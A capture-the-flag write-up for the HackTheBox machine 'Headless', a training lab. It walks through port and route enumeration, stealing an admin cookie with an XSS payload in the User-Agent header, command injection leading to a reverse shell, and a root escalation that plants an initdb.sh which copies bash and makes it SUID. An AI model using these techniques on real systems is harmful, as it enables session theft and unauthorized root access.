---
layout: writeup
category: HTB
description: Headless is an Easy Linux machine of HackTheBox where first its needed to make a XSS attack in the User-Agent as its reflected on the admin's dashboard. Then, we have to inject a command in a user-input field to gain access to the machine. Finally, in the sudo privileges its possible to see that a file is being executed from the current directory without an absolute path, so we can create ours and execute the command we want.
points: 20
solves: 12718
tags: xss command-injection sudoers path-hijacking-./
date: 2024-07-20
title: HTB Headless writeup
comments: false
---

Headless is an Easy Linux machine of HackTheBox where first its needed to make a XSS attack in the User-Agent as its reflected on the admin's dashboard. Then, we have to inject a command in a user-input field to gain access to the machine. Finally, in the sudo privileges its possible to see that a file is being executed from the current directory without an absolute path, so we can create ours and execute the command we want.

# Enumeration

## Port scanning

I will start with a basic TCP port scanning with nmap to see which ports are open and see which services are running:

```bash
❯ sudo nmap -p- --open -sS -sVC --min-rate 5000 -v -n -Pn 10.10.11.8
# Nmap 7.94SVN scan initiated Sat Jul 20 19:15:57 2024 as: nmap -sSVC -p- --open --min-rate 5000 -v -n -Pn -oN headless 10.10.11.8
Nmap scan report for 10.10.11.8
Host is up (0.24s latency).
Not shown: 37194 closed tcp ports (reset), 28339 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Sat, 20 Jul 2024 17:08:23 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2799
|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Under Construction</title>
|     <style>
|     body {
|     font-family: 'Arial', sans-serif;
|     background-color: #f7f7f7;
|     margin: 0;
|     padding: 0;
|     display: flex;
|     justify-content: center;
|     align-items: center;
|     height: 100vh;
|     .container {
|     text-align: center;
|     background-color: #fff;
|     border-radius: 10px;
|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=7/20%Time=669BF0EA%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,BE1,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\
SF:x20Python/3\.11\.2\r\nDate:\x20Sat,\x2020\x20Jul\x202024\x2017:08:23\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x202799\r\nSet-Cookie:\x20is_admin=InVzZXIi\.uAlmXlTvm8vyihjNaPDWnvB_Z
SF:fs;\x20Path=/\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\
SF:x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\
SF:x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-wid
SF:th,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Under\x20Construct
SF:ion</title>\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\x20b
SF:ody\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\
SF:x20'Arial',\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20background-color:\x20#f7f7f7;\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20padding:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20di
SF:splay:\x20flex;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justif
SF:y-content:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:align-items:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20height:\x20100vh;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20\.container\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20text-align:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20background-color:\x20#fff;\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20border-radius:\x2010px;\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20box-shadow:\x200px\x200px\x2020px\x20rgba\(0,\x20
SF:0,\x200,\x200\.2\);\n\x20\x20\x20\x20\x20")%r(RTSPRequest,16C,"<!DOCTYP
SF:E\x20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20
SF:\x20\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x
SF:20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20resp
SF:onse</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20vers
SF:ion\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\
SF:x20code\x20explanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x
SF:20unsupported\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul 20 19:18:09 2024 -- 1 IP address (1 host up) scanned in 131.76 seconds
```

* -sVC: Identifies service and version.
* -p-: scans all the range of ports (1-65535).
* --open: shows only open ports and not filtered or closed.
* -sS: TCP SYN scan that improves velocity because it doesn't establish the connection.
* --min-rate 5000: Sends 5000 packets per second to improve velocity (don't do this in a 
real environment).
* -n: Disables DNS resolution protocol.
* -v: Enables verbose to see which ports are opened while it's scanning
* -Pn: Disables host discovery protocol (ping).
* -oN targeted: Exports the evidence to a file named "tcpTargeted".

There is port 22 for ssh and a 5000 for http, let's take a look at http service.

## Web enumeration
            
The 5000 port seems like a python werkzeug web server as saw in the headers:

```bash
❯ curl -i -s http://10.10.11.8:5000 | head
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.11.2
Date: Sat, 20 Jul 2024 17:19:55 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2799
Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
Connection: close

<!DOCTYPE html>
<html lang="en">
```

There is a cookie `is_admin` which is interesting. Looking in the browser, there's a support questions page:

![main page](/assets/images/Headless/main-page.png)

![support page](/assets/images/Headless/support-page.png)

Fuzzing for valid routes, its possible to see /dashboard which returns 500:

```bash
❯ ffuf -w /opt/SecLists/Discovery/Web-Content/common.txt -u http://10.10.11.8:5000/FUZZ -mc all -fc 404 -t 100

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.8:5000/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: all
 :: Filter           : Response status: 404
________________________________________________

dashboard               [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 229ms]
support                 [Status: 200, Size: 2363, Words: 836, Lines: 93, Duration: 181ms]
:: Progress: [4727/4727] :: Job [1/1] :: 64 req/sec :: Duration: [0:00:45] :: Errors: 0 ::
```

If we insert a `<>` for html injection in the support fields it says "Hacking attempt detected":

![<> hacking attempt detected](/assets/images/Headless/<>hacking-attempt-dettected.png)

And it reflects our headers in the page saying that the browser information has been sent to the administrators:

![request headers sent to administrators](/assets/images/Headless/request-headers-sent-to-administrators.png)

The HTML its successfully injected when put in the headers:

![html injection successfull](/assets/images/Headless/html-injection-successfull.png)

In case this data is reviewed by the administrators, I can send myself a cookie of him. First I will start an http server:

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

And trigger the xss:

![xss triggered](/assets/images/Headless/xss-triggered.png)

I'm able to receive the cookie of some administrator from 10.10.11.8 which is the machine's IP:

![cookie received](/assets/images/Headless/cookie-received.png)

I will insert it, navigate to /dashboard and see I have access:

![access to dashboard](/assets/images/Headless/access-to-dashboard.png)

# Access as dvir

Clicking on "Generate Report", I see its passing a date parameter:

![date parameter dashboard](/assets/images/Headless/date-parameter-dashbaord.png)

Testing command injection works:

![command injection works](/assets/images/Headless/command-injection-works.png)

So I will run the typical reverse shell command to gain access as dvir. First spawn a nc listener:

```bash
❯ nc -lvnp 443
listening on [any] 443 ...
```

Trigger the reverse shell:

![reverse shell triggered](/assets/images/Headless/reverse-shell-triggered.png)

We receive a shell as dvir and successfully can see user.txt:

![shell as dvir](/assets/images/Headless/shell-as-dvir.png)

```bash
dvir@headless:~/app$ cd
cd
dvir@headless:~$ ls
ls
app
geckodriver.log
user.txt
dvir@headless:~$ cat user.txt
cat user.txt
b8****************************00
```

Let's do the common tty trick to have a completely interactive shell where we can do ctrl+l, ctrl+c without killing the shell, etc:

```bash
dvir@headless:~$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
dvir@headless:~$ ^Z
[1]  + 41760 suspended  nc -lvnp 443
❯ stty raw -echo; fg
[1]  + 41760 continued  nc -lvnp 443
                                    reset xterm
dvir@headless:~$ export TERM=xterm
dvir@headless:~$ export SHELL=bash
dvir@headless:~$ stty rows 50 columns 184
```

* ``script /dev/null -c bash``: Spawns a tty.
* ``ctrl+z``: puts the shell in background for later doing a treatment.
* ``stty raw -echo;fg``: give us the shell back again.
* ``reset xterm``: resets the terminal to give us the bash console.
* ``export TERM=xterm``: let us do ctrl+l to clean the terminal.
* ``export SHELL=bash``: specifies the system that we are using a bash console.
* ``stty rows <YOUR ROWS> columns <YOUR COLUMNS>``: establishes the size of the current full terminal window, you can view the adequate running stty size on your machine (you 
can view it with `stty size` in a complete new window).

# Access as root

Looking at the sudo privileges, we can see that we can run as any user without a password `/usr/bin/syscheck`:

```bash
dvir@headless:~$ sudo -l
Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck
```

Running it gives us some info about the system, such as the last kernel modification time, free space on disk and seems to try to run some database service:

```bash
dvir@headless:~$ sudo /usr/bin/syscheck
Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 2.0G
System load average:  0.12, 0.03, 0.01
Database service is not running. Starting it...
```

This file is a shell script:

```bash
dvir@headless:~$ file /usr/bin/syscheck 
/usr/bin/syscheck: Bourne-Again shell script, ASCII text executable
```

First, if the user id's its not root, exits the program:

```bash
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi
```

Second, it executes safely some commands to see the last time vmlinux was modified:

```bash
last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"
```

Also see the available disk space and system load average (also safely):

```bash
disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"
```

Finally, it checks if initdb.sh its running and if not, it runs ./initdb.sh to start it:

```bash
if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0
```

This is very dangerous since its not calling an absolute path and can execute any bash file in the current directory. I will create initdb.sh in /tmp with a instruction to copy the bash to /tmp and make it SUID. Then, I will execute `/usr/bin/syscheck` to call ./initdb.sh. 

```bash
dvir@headless:/tmp$ cd /tmp
dvir@headless:/tmp$ echo 'cp /bin/bash /tmp; chmod u+s /tmp/bash' > initdb.sh
dvir@headless:/tmp$ chmod +x initdb.sh 
dvir@headless:/tmp$ sudo /usr/bin/syscheck
Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 2.0G
System load average:  0.00, 0.00, 0.00
Database service is not running. Starting it...
dvir@headless:/tmp$ ls -l bash 
-rwsr-xr-x 1 root root 1265648 Jul 21 20:02 bash
```

Finally, I can execute `/tmp/bash` with `-p` parameter:

```bash
dvir@headless:/tmp$ ./bash -p
bash-5.2# whoami
root
```

And we have access as root! Now we can see root.txt:

```bash
bash-5.2# cd /root/
bash-5.2# cat root.txt 
b0****************************a6
```